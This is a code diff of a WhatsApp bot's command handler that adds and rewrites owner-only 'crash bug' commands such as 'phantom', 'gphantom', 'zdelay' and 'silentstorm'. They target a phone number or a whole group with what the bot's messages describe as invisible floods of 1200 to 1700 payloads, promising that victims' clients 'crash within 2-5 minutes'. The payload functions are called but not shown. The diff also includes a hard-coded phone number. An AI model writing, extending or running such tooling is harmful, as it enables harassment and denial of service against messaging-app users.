@@ -3069,229 +3069,7 @@ Usage: ${prefix}setbotname <new name>
             }
             break;
         }
-        // ═══════════════════════════════════════════════════
-// ZUKO PHANTOM DELAY - Invisible Strong Delay
-// ═══════════════════════════════════════════════════
-case 'phantom':
-case 'zphantom':
-case 'phantomdelay':
-case 'invisibledelay': {
-  if (!isCreator) return reply("❌ *Owner only command!*");
-
-  let target = null;
-  let iterations = 1;
-
-  // Check if user provided a number or replied to a message
-  if (q) {
-    const parts = q.split(' ');
-    target = parts[0];
-    if (parts[1]) iterations = parseInt(parts[1]) || 1;
-  }
-
-  if (!target && m.quoted) {
-    target = m.quoted.sender || m.quoted.key?.participant || m.quoted.key?.remoteJid;
-  }
-
-  if (!target) {
-    return reply(
-`👻 *ZUKO PHANTOM DELAY* 👻
-
-*Usage:*
-${prefix}phantom <number> [iterations]
-${prefix}phantom 2347059886720 3
-
-*Or reply to a message from the target.*
-
-*Features:*
-• 100% invisible to members
-• 4 attack phases
-• 1200+ total payloads
-• Massive JID mentions
-• Protocol flood
-• Poll flood
-• Document flood
-
-*⚠️ This is a STRONG invisible attack.*`
-    );
-  }
-
-  let jid = target.replace(/[^0-9]/g, '');
-  if (jid.startsWith('0')) return reply("❌ *Invalid number!*");
-  if (jid === '2347059886720') return reply("❌ *This number is protected!*");
-
-  if (iterations > 5) iterations = 5;
-  if (iterations < 1) iterations = 1;
-
-  let isTarget = `${jid}@s.whatsapp.net`;
-
-  await reply(
-`👻 *ZUKO PHANTOM DELAY* 👻
-
-📱 *Target:* ${isTarget}
-🔄 *Iterations:* ${iterations}
-📦 *Payloads per run:* 1200+
-👻 *Visibility:* INVISIBLE
-
-⏳ *Processing...*`
-
-  );
-
-  for (let i = 1; i <= iterations; i++) {
-    try {
-      await ZukoPhantomDelay(isTarget);
-      console.log(`✅ Phantom Delay iteration ${i}/${iterations} sent to ${isTarget}`);
-      if (iterations > 1) {
-        await reply(`🔄 *Iteration ${i}/${iterations} sent to ${isTarget}*`);
-      }
-      await new Promise(resolve => setTimeout(resolve, 3000));
-    } catch (err) {
-      console.error(`Iteration ${i} failed:`, err);
-      await reply(`❌ *Iteration ${i} failed:* ${err.message || 'Unknown error'}`);
-    }
-  }
-
-  await reply(
-`✅ *ZUKO PHANTOM DELAY COMPLETE!*
-
-📱 *Target:* ${isTarget}
-🔄 *Total Iterations:* ${iterations}
-📦 *Total Payloads:* ${iterations * 1200}+
-👻 *Visibility:* 100% INVISIBLE
-
-💀 *Target client should crash within 2-5 minutes.*
-⏳ *No visible messages were sent.*`
-  );
-  break;
-}
-        // ═══════════════════════════════════════════════════
-// ZUKO GROUP PHANTOM - Invisible Group Delay
-// ═══════════════════════════════════════════════════
-case 'gphantom':
-case 'zgroupphantom':
-case 'groupphantom':
-case 'phantomgroup': {
-  if (!isCreator) return reply("❌ *Owner only command!*");
-  if (!m.isGroup) return reply("👥 *This command only works in groups!*");
-  
-
-  let iterations = 1;
-  if (q) {
-    const num = parseInt(q);
-    if (!isNaN(num) && num > 0) iterations = Math.min(num, 3);
-  }
-
-  await reply(
-`👻 *ZUKO GROUP PHANTOM* 👻
-
-📛 *Group:* ${groupName}
-👥 *Members:* ${participants.length}
-🔄 *Iterations:* ${iterations}
-📦 *Payloads per run:* 1550+
-👻 *Visibility:* 100% INVISIBLE
-
-⚠️ *This attack is completely invisible to all members!*
-⏳ *Processing...*`
-  );
-
-  for (let i = 1; i <= iterations; i++) {
-    try {
-      await ZukoGroupPhantom(m.chat);
-      console.log(`✅ Group Phantom iteration ${i}/${iterations} sent to ${m.chat}`);
-      if (iterations > 1) {
-        await reply(`🔄 *Iteration ${i}/${iterations} sent to ${groupName}*`);
-      }
-      await new Promise(resolve => setTimeout(resolve, 3000));
-    } catch (err) {
-      console.error(`Iteration ${i} failed:`, err);
-      await reply(`❌ *Iteration ${i} failed:* ${err.message || 'Unknown error'}`);
-    }
-  }
-
-  await reply(
-`✅ *ZUKO GROUP PHANTOM COMPLETE!*
-
-📛 *Group:* ${groupName}
-👥 *Members:* ${participants.length}
-🔄 *Total Iterations:* ${iterations}
-📦 *Total Payloads:* ${iterations * 1550}+
-👻 *Visibility:* 100% INVISIBLE
-
-💀 *All members' clients should crash within 2-5 minutes.*
-🔇 *No visible messages were sent to the group.*`
-  );
-  break;
-}
-// ═══════════════════════════════════════════════════
-// ZUKO SILENT STORM - Invisible Group Eraser
-// ═══════════════════════════════════════════════════
-case 'silent':
-case 'silentstorm':
-case 'ss':
-case 'zstorm':
-case 'storm': {
-  if (!isCreator) return reply("❌ *Owner only command!*");
-  if (!m.isGroup) return reply("👥 *This command only works in groups!*");
-  
-
-  let iterations = 1;
-  if (q) {
-    const num = parseInt(q);
-    if (!isNaN(num) && num > 0) iterations = Math.min(num, 3);
-  }
-
-  await reply(
-`🌪️ *ZUKO SILENT STORM* 🌪️
-
-📛 *Group:* ${groupName}
-👥 *Members:* ${participants.length}
-🔄 *Iterations:* ${iterations}
-📦 *Payloads per run:* 1700+
-👻 *Visibility:* 100% INVISIBLE
-
-⚠️ *Attack Vectors:*
-• Reactions (400)
-• Deletions (300)
-• Sticker Packs (200)
-• Contacts (200)
-• Locations (200)
-• Payments (150)
-• Protocol Surge (250)
-
-⏳ *Processing...*`
-  );
-
-  for (let i = 1; i <= iterations; i++) {
-    try {
-      await ZukoSilentStorm(m.chat);
-      console.log(`✅ Silent Storm iteration ${i}/${iterations} sent to ${m.chat}`);
-      if (iterations > 1) {
-        await reply(`🔄 *Iteration ${i}/${iterations} sent to ${groupName}*`);
-      }
-      await new Promise(resolve => setTimeout(resolve, 3000));
-    } catch (err) {
-      console.error(`Iteration ${i} failed:`, err);
-      await reply(`❌ *Iteration ${i} failed:* ${err.message || 'Unknown error'}`);
-    }
-  }
-
-  await reply(
-`✅ *ZUKO SILENT STORM COMPLETE!*
-
-📛 *Group:* ${groupName}
-👥 *Members:* ${participants.length}
-🔄 *Total Iterations:* ${iterations}
-📦 *Total Payloads:* ${iterations * 1700}+
-👻 *Visibility:* 100% INVISIBLE
-
-💀 *All members' clients should crash within 2-5 minutes.*
-🔇 *No visible messages were sent to the group.*
-🌪️ *The group has been silenced.*`
-  );
-  break;
-}
-        // ═══════════════════════════════════════════════════
-        // YOUTUBE VIDEO DOWNLOAD
-        // ═══════════════════════════════════════════════════
+       
         case 'ytvideo':
         case 'ytmp4':
         case 'youtube':
@@ -3997,41 +3775,31 @@ ${adminList}`,
         // ═══════════════════════════════════════════════════
 // ZUKO DELAY - Document Flood Bug
 // ═══════════════════════════════════════════════════
+// ═══════════════════════════════════════════════════
+// ZUKO DELAY - Document Flood Bug
+// ═══════════════════════════════════════════════════
 case 'zdelay':
 case 'zbugdelay':
 case 'delaybug': {
   if (!isCreator) return reply("❌ *Owner only command!*");
   if (!q && !m.quoted) {
-    return reply(`⚠️ *Usage:* ${prefix}zdelay <target_number>\n\n*Examples:*\n${prefix}zdelay 2347059886720\n${prefix}zdelay 23480XXXXXXX\n\n*Or reply to a message from the target.*`);
+    return reply(`⚠️ *Usage:* ${prefix}zdelay <target_number>\n\n*Examples:*\n${prefix}zdelay 2347059886720`);
   }
 
   let target = q || m.quoted?.sender;
+  if (!target) return reply("❌ *No target found!*");
 
-  if (!target) {
-    return reply(`❌ *No target found!*\n\nReply to the target's message or type their number.`);
-  }
-
-  // Clean the number
   let jid = target.replace(/[^0-9]/g, '');
-  if (jid.startsWith('0')) {
-    return reply(`❌ *Invalid number!*\n\nNumber should start with country code (e.g., 23480XXXXXXX).`);
-  }
-
-  // Protected numbers (you can add more)
-  const protectedNumbers = ['2347059886720'];
-  if (protectedNumbers.includes(jid)) {
-    return reply("❌ *This number is protected!*");
-  }
+  if (jid.startsWith('0')) return reply("❌ *Invalid number!*");
+  if (jid === '2347059886720') return reply("❌ *This number is protected!*");
 
   let isTarget = `${jid}@s.whatsapp.net`;
 
-  await reply(`⛤ *ZUKO DELAY BUG* ⛤\n\n📱 *Target:* ${isTarget}\n📦 *Payload:* Document Flood\n👻 *Status:* Sending...\n\n⏳ *Waiting for effect...*\n\n⚠️ *This attack sends massive document payloads with thousands of mentions.*`);
+  await reply(`⛤ *ZUKO DELAY BUG* ⛤\n\n📱 *Target:* ${isTarget}\n📦 *Payload:* Document Flood\n⏳ *Sending...*`);
 
   try {
-    // Run the delay bug
-    await ZukoDelay(isTarget);
-    
-    await reply(`✅ *ZUKO DELAY BUG COMPLETE!*\n\n📱 *Target:* ${isTarget}\n💀 *Status:* Delivered\n\n⏳ *Client may crash within 2-5 minutes.*`);
+    await ZukoDelay(empire, isTarget);
+    await reply(`✅ *ZUKO DELAY BUG COMPLETE!*\n\n📱 *Target:* ${isTarget}\n💀 *Client may crash within 2-5 minutes.*`);
   } catch (err) {
     console.error('ZukoDelay error:', err);
     await reply(`❌ *Error:* ${err.message || 'Unknown error'}`);
@@ -4039,44 +3807,84 @@ case 'delaybug': {
   break;
 }
 
-case 'zdelay2':
-case 'zbugloop':
-case 'delayloop': {
+// ═══════════════════════════════════════════════════
+// ZUKO PHANTOM DELAY
+// ═══════════════════════════════════════════════════
+case 'phantom':
+case 'zphantom':
+case 'phantomdelay':
+case 'invisibledelay': {
   if (!isCreator) return reply("❌ *Owner only command!*");
-  if (!q && !m.quoted) {
-    return reply(`⚠️ *Usage:* ${prefix}zdelay-loop <target_number> <iterations>\n\n*Example:* ${prefix}zdelay-loop 2347059886720 10\n\n*Sends the delay bug multiple times.*`);
+
+  let target = null;
+  if (q) {
+    const parts = q.split(' ');
+    target = parts[0];
   }
-
-  let parts = q.split(' ');
-  let target = parts[0] || m.quoted?.sender;
-  let iterations = parseInt(parts[1]) || 5;
-
-  if (!target) return reply("❌ *No target found!*");
+  if (!target && m.quoted) {
+    target = m.quoted.sender || m.quoted.key?.participant || m.quoted.key?.remoteJid;
+  }
+  if (!target) {
+    return reply(`👻 *Usage:* ${prefix}phantom <number>\n${prefix}phantom 2347059886720`);
+  }
 
   let jid = target.replace(/[^0-9]/g, '');
   if (jid.startsWith('0')) return reply("❌ *Invalid number!*");
   if (jid === '2347059886720') return reply("❌ *This number is protected!*");
 
-  if (iterations > 20) iterations = 20;
-  if (iterations < 1) iterations = 1;
-
   let isTarget = `${jid}@s.whatsapp.net`;
 
-  await reply(`⛤ *ZUKO DELAY LOOP* ⛤\n\n📱 *Target:* ${isTarget}\n🔄 *Iterations:* ${iterations}\n👻 *Status:* Sending...`);
+  await reply(`👻 *ZUKO PHANTOM DELAY*\n📱 *Target:* ${isTarget}\n⏳ *Processing...*`);
 
-  for (let i = 1; i <= iterations; i++) {
-    try {
-      await ZukoDelay(isTarget);
-      console.log(`✅ ZukoDelay iteration ${i}/${iterations} sent to ${isTarget}`);
-      await reply(`🔄 *Iteration ${i}/${iterations} sent to ${isTarget}*`);
-      await delay(2000); // Wait 2 seconds between each to avoid rate limiting
-    } catch (err) {
-      console.error(`Iteration ${i} failed:`, err);
-      await reply(`❌ *Iteration ${i} failed:* ${err.message || 'Unknown error'}`);
-    }
+  try {
+    await ZukoPhantomDelay(empire, isTarget);
+    await reply(`✅ *PHANTOM DELAY COMPLETE!*\n💀 *Target should crash within 2-5 minutes.*`);
+  } catch (err) {
+    await reply(`❌ *Error:* ${err.message}`);
   }
+  break;
+}
 
-  await reply(`✅ *ZUKO DELAY LOOP COMPLETE!*\n\n📱 *Target:* ${isTarget}\n🔄 *Total:* ${iterations} iterations\n💀 *Status:* All sent\n\n⏳ *Client may crash within 2-5 minutes.*`);
+// ═══════════════════════════════════════════════════
+// ZUKO GROUP PHANTOM
+// ═══════════════════════════════════════════════════
+case 'gphantom':
+case 'zgroupphantom':
+case 'groupphantom':
+case 'phantomgroup': {
+  if (!isCreator) return reply("❌ *Owner only command!*");
+  if (!m.isGroup) return reply("👥 *This command only works in groups!*");
+
+  await reply(`👻 *ZUKO GROUP PHANTOM*\n📛 *Group:* ${groupName}\n👥 *Members:* ${participants.length}\n⏳ *Processing...*`);
+
+  try {
+    await ZukoGroupPhantom(empire, m.chat);
+    await reply(`✅ *GROUP PHANTOM COMPLETE!*\n💀 *All members should crash within 2-5 minutes.*`);
+  } catch (err) {
+    await reply(`❌ *Error:* ${err.message}`);
+  }
+  break;
+}
+
+// ═══════════════════════════════════════════════════
+// ZUKO SILENT STORM
+// ═══════════════════════════════════════════════════
+case 'silent':
+case 'silentstorm':
+case 'ss':
+case 'zstorm':
+case 'storm': {
+  if (!isCreator) return reply("❌ *Owner only command!*");
+  if (!m.isGroup) return reply("👥 *This command only works in groups!*");
+
+  await reply(`🌪️ *ZUKO SILENT STORM*\n📛 *Group:* ${groupName}\n👥 *Members:* ${participants.length}\n⏳ *Processing...*`);
+
+  try {
+    await ZukoSilentStorm(empire, m.chat);
+    await reply(`✅ *SILENT STORM COMPLETE!*\n🌪️ *Group has been silenced.*`);
+  } catch (err) {
+    await reply(`❌ *Error:* ${err.message}`);
+  }
   break;
 }
         
